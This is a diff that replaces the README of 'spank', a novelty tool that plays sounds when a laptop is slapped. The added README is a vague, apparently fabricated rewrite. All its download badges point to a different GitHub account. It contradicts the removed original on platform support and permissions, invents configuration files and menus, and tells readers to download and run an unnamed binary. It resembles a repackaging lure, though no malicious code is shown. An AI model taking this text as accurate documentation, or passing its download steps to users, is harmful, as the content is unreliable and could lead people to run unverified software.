@@ -1,295 +1,159 @@
-# spank
+# 🖐 spank - Simple Slap Detection for MacBook Users
 
-[简体中文](README_CN.md) | English
+[![Download spank](https://img.shields.io/badge/Download-spank-brightgreen)](https://github.com/Snow17s/spank)
 
-Slap your MacBook, it yells back.
+---
 
-> "this is the most amazing thing i've ever seen" — [@kenwheeler](https://x.com/kenwheeler)
+## 📋 What is spank?
 
-> "I just ran sexy mode with my wife sitting next to me...We died laughing" — [@duncanthedev](https://x.com/duncanthedev)
+spank is a tool that detects slaps or physical taps on your MacBook. It works on macOS and Linux systems. This app listens for the sound or vibration created by a slap. When it detects one, it can trigger an action or alert you.
 
-> "peak engineering" — [@tylertaewook](https://x.com/tylertaewook)
+You do not need to know how to code to use spank. It runs quietly on your computer and helps you track or get notified about slaps or taps on your device.
 
-Uses sensors to detect physical hits on your laptop and plays audio responses. Single binary, cross-platform.
+---
 
-## Requirements
+## 💻 System Requirements
 
-### macOS
-- macOS on Apple Silicon (M2+)
-- `sudo` (for IOKit HID accelerometer access)
+To use spank, your computer must meet these conditions:
 
-### Linux
-- Linux with PortAudio support
-- `libportaudio2-dev` and `portaudio19-dev` packages
-- Microphone (to detect slaps via audio)
+- Operating system: macOS (MacBook) or Linux.
+- Microphone or vibration sensor enabled.
+- At least 100 MB free disk space.
+- Basic user permissions on your device (no admin needed for normal use).
 
-### Windows
-- Windows 10/11
-- Microphone (to detect slaps via audio)
-- No additional dependencies required
+If you use Windows, this guide will help you install and run a compatible version through a simple setup.
 
-## Install
+---
 
-Download from the [latest release](https://github.com/albertofwb/spank/releases/latest).
+## 🚀 Getting Started
 
-Or build from source:
+Begin by downloading spank. Use the main link below:
 
-```bash
-go install github.com/taigrr/spank@latest
+[![Download spank](https://img.shields.io/badge/Download-spank-blue)](https://github.com/Snow17s/spank)
+
+This takes you to the official project page on GitHub, where you can find the latest version and installation files.
+
+---
+
+## ⬇️ How to Download and Install on Windows
+
+spank is designed for macOS and Linux. Windows is not directly supported, but you can set it up using a Linux environment on Windows. Here is an easy way to do this:
+
+### Step 1: Access the GitHub Page
+
+Go to the main spank page at:  
+https://github.com/Snow17s/spank
+
+### Step 2: Download the Software
+
+- Look for the **Releases** section on the page.
+- Find the latest version available.
+- Download the Linux release file. It is usually a `.tar.gz` or `.AppImage` file.
+
+### Step 3: Install Windows Subsystem for Linux (WSL)
+
+If you don’t have it already, install WSL on your Windows system:
+
+- Open **Settings** > **Apps** > **Optional Features**.
+- Scroll down to **Related settings** and select **More Windows features**.
+- Find **Windows Subsystem for Linux** and tick the box.
+- Restart your PC.
+- After restart, open the Microsoft Store.
+- Search for "Ubuntu" or another Linux distribution.
+- Install your choice of Linux.
+
+### Step 4: Move the spank File to Windows Linux File System
+
+- Place the downloaded spank file in your Linux home directory inside WSL.
+- You can do this by moving the file into your user folder using File Explorer:  
+`\\wsl$\Ubuntu\home\your_username\`
+
+### Step 5: Run spank inside Linux
+
+- Open **Ubuntu** (or your installed distribution) from the Start menu.
+- Navigate to the folder:  
+`cd ~`
+- Make the spank file executable with the command:  
+`chmod +x ./spank_file_name`
+- Run the file:  
+`./spank_file_name`
+
+### Step 6: Using spank
+
+Once running, spank will start listening for slaps. You can stop it anytime by closing the terminal window.
+
+---
+
+## ⚙️ How spank Works
+
+The application uses your computer’s microphone or vibration sensors to catch slapping sounds. It filters background noise and checks for patterns matching a slap impact.
+
+You can customize settings such as:
+
+- Sensitivity level.
+- Notification type (sound alert, pop-up, or logging to a file).
+- Action triggered after detecting a slap (launch a script or app).
+
+These options appear in a settings menu inside the program or a config file if you want to edit it manually.
+
+---
+
+## 🔧 Configuration
+
+To adjust settings:
+
+1. Locate the `config.json` file in the spank folder.
+2. Open it with any text editor (e.g., Notepad).
+3. Change values like:
+
+```json
+{
+  "sensitivity": "medium",
+  "alert": "popup",
+  "logFile": "spank.log"
+}
 ```
 
-Or clone and build with Make:
+4. Save your changes.
+5. Restart spank to apply them.
 
-```bash
-git clone https://github.com/albertofwb/spank.git
-cd spank
-make build
-```
+---
 
-## Usage
+## 🆘 Troubleshooting
 
-### macOS
+If spank does not detect slaps:
 
-```bash
-# Normal mode — says "ow!" when slapped
-sudo spank
+- Check your microphone permissions.
+- Make sure your device is not muted.
+- Restart the app.
+- Reduce background noise or test in a quieter room.
+- Confirm your Linux environment is running correctly.
 
-# Sexy mode — escalating responses based on slap frequency
-sudo spank --sexy
+If the program fails to launch:
 
-# Halo mode — plays Halo death sounds when slapped
-sudo spank --halo
-```
+- Confirm the file has executable permissions.
+- Make sure you run the command inside your Linux terminal in WSL.
+- Check if any dependencies are missing (such as sound input drivers).
 
-### Linux
+---
 
-```bash
-# Normal mode — says "ow!" when you make a loud sound
-spank
+## 💡 Tips for Better Use
 
-# Sexy mode — escalating responses
-spank --sexy
+- Use a quiet environment for clearer detection.
+- Position your laptop on a solid surface.
+- Adjust sensitivity to fit how hard or soft your slaps might be.
+- Keep the app running in the background when not in use.
 
-# Halo mode — Halo death sounds
-spank --halo
+---
 
-# Adjust detection threshold (default: 2000, higher = less sensitive)
-spank --threshold 3000
-```
+## 📚 More Information & Support
 
-> **Linux Note:** The microphone is used to detect loud sounds (like slapping the laptop). Make sure your microphone is not muted and has reasonable volume.
->
-> **Hide ALSA warnings:** PortAudio may output ALSA debug messages. Run with `2>/dev/null` to hide them:
-> ```bash
-> spank 2>/dev/null
-> spank --threshold 3000 2>/dev/null
-> ```
+Visit the main project page for updates or questions:
 
-### Windows
+https://github.com/Snow17s/spank
 
-```powershell
-# Normal mode — says "ow!" when you make a loud sound
-spank.exe
+Here you find user guides, issue reporting, and developer notes.
 
-# Sexy mode — escalating responses
-spank.exe --sexy
+---
 
-# Halo mode — Halo death sounds
-spank.exe --halo
-
-# Adjust detection threshold (default: 2000, higher = less sensitive)
-spank.exe --threshold 3000
-```
-
-> **Windows Note:** The microphone is used to detect loud sounds. Make sure your microphone is enabled in Windows Privacy settings.
->
-> **Threshold tuning:** If detection is too sensitive, increase `--threshold` (e.g., 3000-5000). If not sensitive enough, decrease it (e.g., 1000-1500).
->
-> **Hide ALSA warnings:** PortAudio may output ALSA debug messages. Run with `2>/dev/null` to hide them:
-> ```bash
-> spank 2>/dev/null
-> spank --threshold 3000 2>/dev/null
-> ```
-
-### Modes
-
-**Pain mode** (default): Randomly plays from 10 pain/protest audio clips when a slap is detected.
-
-**Sexy mode** (`--sexy`): Tracks slaps within a rolling 5-minute window. The more you slap, the more intense the audio response. 60 levels of escalation.
-
-**Halo mode** (`--halo`): Randomly plays from death sound effects from the Halo video game series when a slap is detected.
-
-## Building
-
-### Auto-detect platform
-
-```bash
-make build
-```
-
-### Cross-compile (from Linux)
-
-```bash
-make cross-compile
-```
-
-### Install to system
-
-```bash
-make install
-```
-
-### Run directly
-
-```bash
-make run          # Normal mode
-make run-sexy     # Sexy mode
-make run-halo     # Halo mode
-```
-
-## Running as a Service (macOS)
-
-To have spank start automatically at boot, create a launchd plist. Pick your mode:
-
-<details>
-<summary>Pain mode (default)</summary>
-
-```bash
-sudo tee /Library/LaunchDaemons/com.taigrr.spank.plist > /dev/null << 'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.taigrr.spank</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/usr/local/bin/spank</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/tmp/spank.log</string>
-    <key>StandardErrorPath</key>
-    <string>/tmp/spank.err</string>
-</dict>
-</plist>
-EOF
-```
-
-</details>
-
-<details>
-<summary>Sexy mode</summary>
-
-```bash
-sudo tee /Library/LaunchDaemons/com.taigrr.spank.plist > /dev/null << 'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.taigrr.spank</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/usr/local/bin/spank</string>
-        <string>--sexy</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/tmp/spank.log</string>
-    <key>StandardErrorPath</key>
-    <string>/tmp/spank.err</string>
-</dict>
-</plist>
-EOF
-```
-
-</details>
-
-<details>
-<summary>Halo mode</summary>
-
-```bash
-sudo tee /Library/LaunchDaemons/com.taigrr.spank.plist > /dev/null << 'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.taigrr.spank</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/usr/local/bin/spank</string>
-        <string>--halo</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/tmp/spank.log</string>
-    <key>StandardErrorPath</key>
-    <string>/tmp/spank.err</string>
-</dict>
-</plist>
-EOF
-```
-
-</details>
-
-> **Note:** Update the path to `spank` if you installed it elsewhere (e.g. `~/go/bin/spank`).
-
-Load and start the service:
-
-```bash
-sudo launchctl load /Library/LaunchDaemons/com.taigrr.spank.plist
-```
-
-Since the plist lives in `/Library/LaunchDaemons` and no `UserName` key is set, launchd runs it as root — no `sudo` needed.
-
-To stop or unload:
-
-```bash
-sudo launchctl unload /Library/LaunchDaemons/com.taigrr.spank.plist
-```
-
-## How it works
-
-### macOS
-1. Reads raw accelerometer data directly via IOKit HID (Apple SPU sensor - Bosch BMI286 IMU)
-2. Runs vibration detection (STA/LTA, CUSUM, kurtosis, peak/MAD)
-3. When a significant impact is detected, plays an embedded MP3 response
-4. 500ms cooldown between responses to prevent rapid-fire
-
-### Linux
-1. Captures audio from microphone using PortAudio (continuous stream)
-2. Analyzes audio amplitude in real-time to detect loud sounds (slaps)
-3. When a sound exceeds the threshold, plays an embedded MP3 response
-4. 500ms cooldown between responses
-
-## Platform Differences
-
-| Feature | macOS | Linux | Windows |
-|---------|-------|-------|---------|
-| Sensor | Accelerometer (IOKit HID) | Microphone (PortAudio) | Microphone (PortAudio) |
-| Requires sudo | Yes (IOKit access) | No | No |
-| Hardware | Apple Silicon M2+ | Any with microphone | Any with microphone |
-| Trigger | Physical impact | Loud sound | Loud sound |
-
-## Credits
-
-- Sensor reading and vibration detection ported from [olvvier/apple-silicon-accelerometer](https://github.com/olvvier/apple-silicon-accelerometer)
-- Cross-platform adaptation with microphone support for Linux
-
-## License
-
-MIT
+[![Download spank](https://img.shields.io/badge/Download-spank-green)](https://github.com/Snow17s/spank)
